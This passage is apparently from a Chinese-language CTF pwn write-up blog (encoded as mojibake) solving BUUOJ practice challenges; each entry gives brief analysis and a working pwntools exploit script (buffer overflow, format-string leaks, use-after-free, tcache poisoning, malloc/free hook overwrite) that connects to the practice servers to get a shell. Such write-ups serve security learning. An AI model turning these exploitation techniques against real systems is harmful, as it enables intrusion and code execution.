<h2 id="0x064-æŠ¤ç½‘æ¯-2018-gettingstart-Overflow"><a href="#0x064-æŠ¤ç½‘æ¯-2018-gettingstart-Overflow" class="headerlink" title="0x064.æŠ¤ç½‘æ¯_2018_gettingstart - Overflow"></a>0x064.æŠ¤ç½‘æ¯_2018_gettingstart - Overflow</h2><p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
<p>æº¢å‡ºæ”¹ä¸¤ä¸ªå€¼å³å¯æ‹¿ shell</p>
<p><img src="https://i.loli.net/2021/05/08/nkW7gFRcE9qzjD2.png" alt="imaeg.png"></p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">28688</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x18</span> + p64(<span class="number">0x7FFFFFFFFFFFFFFF</span>) + p64(<span class="number">0x3FB999999999999A</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/05/08/hQ1lViW6xfOKTHp.png" alt="image.png"></p>
<h2 id="0x065-wustctf2020-number-game"><a href="#0x065-wustctf2020-number-game" class="headerlink" title="0x065.wustctf2020_number_game"></a>0x065.wustctf2020_number_game</h2><p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
<p>è¯»ä¸€ä¸ªæ•°ï¼Œè¦å¥¹æœ¬èº«å°äºç­‰äº 0 ä¸” å…¶å–è´Ÿå€¼åŒæ ·å°äºç­‰äº 0</p>
<p><img src="https://i.loli.net/2021/05/08/CDsAHl3Wmq9RFQo.png" alt="image.png"></p>
<p>è€ƒè™‘ 0x80000000ï¼Œå…¶æœ¬èº«ä¸ºè´Ÿæ•°ï¼Œå–åç  + 1 è¿˜æ˜¯è´Ÿæ•°</p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">27318</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">0x80000000</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/05/08/nqA9NubdoTzZSD2.png" alt="image.png"></p>
<h2 id="0x066-gyctf-2020-some-thing-interesting-fmtstr-heap-fengshui"><a href="#0x066-gyctf-2020-some-thing-interesting-fmtstr-heap-fengshui" class="headerlink" title="0x066.gyctf_2020_some_thing_interesting - fmtstr + heap fengshui"></a>0x066.gyctf_2020_some_thing_interesting - fmtstr + heap fengshui</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code>ï¼Œä¿æŠ¤å…¨å¼€</p>
<p><img src="https://i.loli.net/2021/05/08/uDpcw1BxtlgU4Vi.png" alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
<p>ä¸€å¼€å§‹ä¼šè®©ä½ è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²å¹¶éªŒè¯ï¼Œä½†æ˜¯åªæ¯”è¾ƒå‰ 0xE ä¸ªå­—ç¬¦</p>
<p><img src="https://i.loli.net/2021/05/08/SwsrCdyuYHjmOXM.png" alt="image.png"></p>
<p>å¤§æ¦‚æœ‰ç€æ‰“å°åˆå§‹å­—ç¬¦ä¸²ã€åˆ›å»ºã€ä¿®æ”¹ã€é‡Šæ”¾ã€æ‰“å°å †å—çš„åŠŸèƒ½</p>
<p><img src="https://i.loli.net/2021/05/08/Klb5Mjz1fiOEDan.png" alt="image.png"></p>
<p>å­˜åœ¨ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p>
<p><img src="https://i.loli.net/2021/05/08/1kfMqJVdjX2WtBe.png" alt="image.png"></p>
<p>ä¸€æ¬¡å¯ä»¥åˆ†é…ä¸¤ä¸ª chunkï¼Œ ä½†æ˜¯é™åˆ¶äº†å¤§å°ï¼Œä¼¼ä¹æ²¡æ³•ç›´æ¥æ‹¿ unsorted</p>
<p><img src="https://i.loli.net/2021/05/08/Z8nI216umoASfFv.png" alt="image.png"></p>
<p>æœ‰ä¸€ä¸ªè£¸çš„ UAF</p>
<p><img src="https://i.loli.net/2021/05/08/esRcMFojZVEN3Sh.png" alt="image.png"></p>
<p>åˆ©ç”¨æ ¼å¼å­—ç¬¦ä¸²æ³„æ¼å‡ºä½äºæ ˆä¸Šçš„ libc ç›¸å…³åœ°å€ä»¥è·å¾— libc åŸºå€åæ”¹ malloc hook ä¸º one_gadget å³å¯</p>
<p>exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p_name = <span class="string">&#x27;./gyctf_2020_some_thing_interesting&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">25477</span>)<span class="comment">#process(p_name)#</span></span><br><span class="line">e = ELF(p_name)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; Now please tell me what you want to do :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>():</span><br><span class="line">    cmd(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">o_size:<span class="built_in">int</span>, o_content, r_size:<span class="built_in">int</span>, r_content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; O&#x27;s length :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(o_size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; O :&quot;</span>)</span><br><span class="line">    p.send(o_content)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; RE&#x27;s length :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(r_size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; RE :&quot;</span>)</span><br><span class="line">    p.send(r_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, o_content, r_content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; O :&quot;</span>)</span><br><span class="line">    p.send(o_content)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; RE :&quot;</span>)</span><br><span class="line">    p.send(r_content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; Oreo ID :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; Oreo ID :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    p.sendline(<span class="string">b&quot;OreOOrereOOreO%17$p&quot;</span>)</span><br><span class="line">    cmd(<span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;OreOOrereOOreO&quot;</span>)</span><br><span class="line">    __libc_start_main = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>) - <span class="number">240</span></span><br><span class="line">    libc_base = __libc_start_main - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b&#x27;arttnba3&#x27;</span>, <span class="number">0x60</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>, <span class="number">0x60</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span>))</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b&#x27;arttnba3&#x27;</span>, <span class="number">0x60</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; O&#x27;s length :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">0x60</span>).encode())</span><br><span class="line">    p.send(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x13</span> + p64(libc_base + <span class="number">0xf1147</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; RE&#x27;s length :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">0x10</span>).encode())</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/05/11/1GeNDRqhxuXKs9b.png" alt="image.png"></p>
<h2 id="0x067-ciscn-2019-en-3-fmtstr-Use-After-Free-tcache-poisoning"><a href="#0x067-ciscn-2019-en-3-fmtstr-Use-After-Free-tcache-poisoning" class="headerlink" title="0x067.ciscn_2019_en_3 - fmtstr + Use After Free + tcache poisoning"></a>0x067.ciscn_2019_en_3 - fmtstr + Use After Free + tcache poisoning</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code>ï¼Œä¿æŠ¤å…¨å¼€</p>
<p><img src="https://i.loli.net/2021/05/11/JXhWjCHkByE31rc.png" alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
<p>ç›´æ¥å°±æœ‰ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¯ä»¥ç”¨æ¥æ¼ libc åŸºå€</p>
<p><img src="https://i.loli.net/2021/05/11/c2LP6F15QUGKOAm.png" alt="image.png"></p>
<p>åªæœ‰åˆ†é…å’Œé‡Šæ”¾çš„åŠŸèƒ½ï¼Œä½†æ˜¯ç›´æ¥å°±æœ‰ä¸€ä¸ª UAF ï¼Œé‚£å°±ç›´æ¥æ”¹ free hook ä¸º system</p>
<p><img src="https://i.loli.net/2021/05/11/7F6KH4WGI2Lfuts.png" alt="image.png"></p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p_name = <span class="string">&#x27;./ciscn_2019_en_3&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">29112</span>)<span class="comment">#process(p_name)#</span></span><br><span class="line">e = ELF(p_name)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.27.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Input your choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input the size of story: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;please inpute the story: &quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input the index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    p.sendline(<span class="string">b&quot;%p%p%p%p%p%p%p%p%p%p%p%p%p%p&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;114514&#x27;</span>)</span><br><span class="line">    s = p.recvuntil(<span class="string">b&quot;0x7025702570257025&quot;</span>)[-<span class="number">32</span>:]</span><br><span class="line">    libc_leak = <span class="built_in">int</span>(s[:<span class="number">14</span>], <span class="number">16</span>)</span><br><span class="line">    libc_base = (libc_leak - libc.sym[<span class="string">&#x27;setbuffer&#x27;</span>]) &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0x10</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x10</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/05/11/6AF5pzPMXTVZgsW.png" alt="image.png"></p>
<h2 id="0x068-picoctf-2018-buffer-overflow-0-ret2text"><a href="#0x068-picoctf-2018-buffer-overflow-0-ret2text" class="headerlink" title="0x068.picoctf_2018_buffer overflow 0 - ret2text"></a>0x068.picoctf_2018_buffer overflow 0 - ret2text</h2><p>å¤§æ¦‚æ˜¯è®©æˆ‘ä»¬è¿ä¸€ä¸ªæœåŠ¡å™¨ï¼Œä¸Šè¾¹çš„ <code>vuln</code> ç¨‹åºæ˜¯å¸¦æœ‰æ¼æ´çš„ SUID ç¨‹åº</p>
<p><img src="https://i.loli.net/2021/05/11/huBEnOyATvwlPJa.png" alt="image.png"></p>
<p>æ¼æ´æ¯”è¾ƒæ˜æ˜¾ï¼Œæ‹·è´çš„æ—¶å€™å­˜åœ¨æ ˆæº¢å‡º</p>
<p><img src="https://i.loli.net/2021/05/11/mSujzkxf4WI6eEy.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2021/05/11/ZVc32L98UjFOQY1.png" alt="image.png"></p>
<p>æœ‰ä¸€ä¸ªæ‹¿flagçš„å‡½æ•°ï¼Œè¿”å›åˆ°è¿™é‡Œå³å¯</p>
<p><img src="https://i.loli.net/2021/05/11/nesRubvEjJGxahO.png" alt="image.png"></p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./vuln aaaaaaaaaaaaaaaaaaaaaaaaaaaa+\x86\x04\x08</span></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯è·å¾— flag</p>
<p><img src="https://i.loli.net/2021/05/11/Ar7pNCcubMWVtEg.png" alt="image.png"></p>
<h2 id="0x069-bjdctf-2020-YDSneedGrirlfriend-Use-After-Free-heap-arrangement"><a href="#0x069-bjdctf-2020-YDSneedGrirlfriend-Use-After-Free-heap-arrangement" class="headerlink" title="0x069.bjdctf_2020_YDSneedGrirlfriend - Use After Free + heap arrangement"></a>0x069.bjdctf_2020_YDSneedGrirlfriend - Use After Free + heap arrangement</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code>ï¼Œåªå¼€äº† NX å’Œ canary</p>
<p><img src="https://i.loli.net/2021/07/21/lAnG7YvbVOseIdH.png" alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æï¼Œå¤§æ¦‚æ˜¯æä¾›äº†åˆ†é…ã€é‡Šæ”¾ã€æ‰“å°çš„åŠŸèƒ½</p>
<p>å…¶ä¸­ girlfriend ç»“æ„ä½“ä¸º 0x10 çš„ chunkï¼Œç»“æ„å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">void</span> (* print_func)(<span class="type">char</span>*);</span><br><span class="line">    <span class="type">char</span> * name;</span><br><span class="line">&#125;girlfriend;</span><br></pre></td></tr></table></figure>

<p>å³ä¸€æ¬¡åˆ†é…ä¼šåˆ†é…ä¸¤ä¸ª chunkï¼Œä¸€ä¸ª malloc(0x10)ï¼Œä¸€ä¸ªmalloc(size)</p>
<p>æ¼æ´ç‚¹ä¸»è¦åœ¨äºé‡Šæ”¾å‡½æ•°ä¸­æœªå°†æŒ‡é’ˆç½®0ï¼Œ<strong>å­˜åœ¨ UAF æ¼æ´</strong></p>
<p><img src="https://i.loli.net/2021/07/21/RB5kciVsyJnXg9t.png" alt="image.png"></p>
<p>æœ‰ä¸ªåé¢å‡½æ•°ï¼Œé‚£å°±ç®€å•å †é£æ°´ä¸€ä¸‹æ”¹å‡½æ•°æŒ‡é’ˆä¸ºåé—¨å‡½æ•°å³å¯</p>
<p><img src="https://i.loli.net/2021/07/21/KJDxWpXdu2Nlcnt.png" alt="image.png"></p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p_name = <span class="string">&#x27;./bjdctf_2020_YDSneedGrirlfriend&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25890</span>)<span class="comment">#process(p_name)#</span></span><br><span class="line">e = ELF(p_name)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Her name size is :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Her name is :&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0x30</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x10</span>, p64(<span class="number">0x400B9C</span>)) <span class="comment"># idx 2</span></span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/07/21/8zTKsoxvmAY6U5X.png" alt="image.png"></p>
<h2 id="0x06A-wustctf2020-name-your-dog-write-out-of-bound"><a href="#0x06A-wustctf2020-name-your-dog-write-out-of-bound" class="headerlink" title="0x06A.wustctf2020_name_your_dog - write out of bound"></a>0x06A.wustctf2020_name_your_dog - write out of bound</h2><p>å’Œå‰é¢çš„ 0x061 åŸºæœ¬ä¸Šä¸€æ ·ï¼Œä¸åŒçš„æ˜¯è¿™ä¸€æ¬¡æº¢å‡ºçš„åœ°æ–¹åœ¨ bss æ®µä¸Š</p>
<p><img src="https://i.loli.net/2021/05/11/uClUxqFIW92pXHc.png" alt="image.png"></p>
<p>å¾€ got è¡¨å†™åé—¨å‡½æ•°åœ°å€å³å¯</p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">26437</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Name for which?\n&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;-7&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Give your name plz: &quot;</span>)</span><br><span class="line">p.sendline(p32(<span class="number">0x80485cb</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/05/11/xkN7g1MEFKQSv6j.png" alt="image.png"></p>
<h2 id="0x06B-judgement-mna-2016-fmtstr"><a href="#0x06B-judgement-mna-2016-fmtstr" class="headerlink" title="0x06B.judgement_mna_2016 - fmtstr"></a>0x06B.judgement_mna_2016 - fmtstr</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code>ï¼Œåªå¼€äº†NXå’Œcanary</p>
<p><img src="https://i.loli.net/2021/05/11/GiRNK3CowZaez9g.png" alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
<p>æœ‰ä¸ªè£¸çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p>
<p><img src="https://i.loli.net/2021/05/11/CDo5JXQmbn1LuAv.png" alt="image.png"></p>
